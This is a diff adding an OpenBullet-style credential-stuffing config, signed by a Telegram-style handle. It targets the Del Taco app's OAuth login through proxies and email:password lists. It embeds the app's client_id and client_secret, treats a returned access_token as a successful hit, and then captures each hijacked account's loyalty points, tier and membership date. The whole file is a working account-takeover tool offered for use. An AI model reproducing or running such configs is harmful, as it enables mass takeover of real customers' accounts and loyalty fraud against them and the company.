@@ -1,0 +1,91 @@
+[SETTINGS]
+{
+  "Name": "Del Taco(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-29T08:20:43.7149985+02:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://cust1184.cheetahedp.com/oauth/token" 
+  CONTENT "email=<USER>&client_secret=4f7082bd0d2341ad786bbc618cf2ddd77224b5712e36cfd13da4125b9973e5b9&password=<PASS>&client_id=b9db208bd1235fb9161e0febdfc571463ba9153ed5935baaf346bbd626e5dbce&grant_type=password" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "accept: application/vnd.stellar-v1+json" 
+  HEADER "accept-encoding: gzip" 
+  HEADER "accept-language: en" 
+  HEADER "connection: Keep-Alive" 
+  HEADER "content-length: 217" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "host: cust1184.cheetahedp.com" 
+  HEADER "user-agent: DelTaco/3.3.0.73 Android/7.1.2/SM-G988N" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "invalid_grant\",\"message" 
+    KEY "Invalid login." 
+    KEY "Please check your credentials and try again" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+
+PARSE "<SOURCE>" LR "\"access_token\":\"" "\"," -> VAR "tok" 
+
+REQUEST GET "https://cust1184.cheetahedp.com/api/profile" 
+  
+  HEADER "accept: application/vnd.stellar-v1+json" 
+  HEADER "accept-encoding: gzip" 
+  HEADER "accept-language: en" 
+  HEADER "authorization: Bearer <tok>" 
+  HEADER "connection: Keep-Alive" 
+  HEADER "host: cust1184.cheetahedp.com" 
+  HEADER "user-agent: DelTaco/3.3.0.73 Android/7.1.2/SM-G988N" 
+
+PARSE "<SOURCE>" LR "\"total_points_in_period\":" "," CreateEmpty=FALSE -> CAP "Points" 
+
+PARSE "<SOURCE>" LR "\"current_tier\":\"" "\"," CreateEmpty=FALSE -> CAP "Current Tier" 
+
+PARSE "<SOURCE>" LR "\"member_since\":\"" "\"," CreateEmpty=FALSE -> CAP "Member Since" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
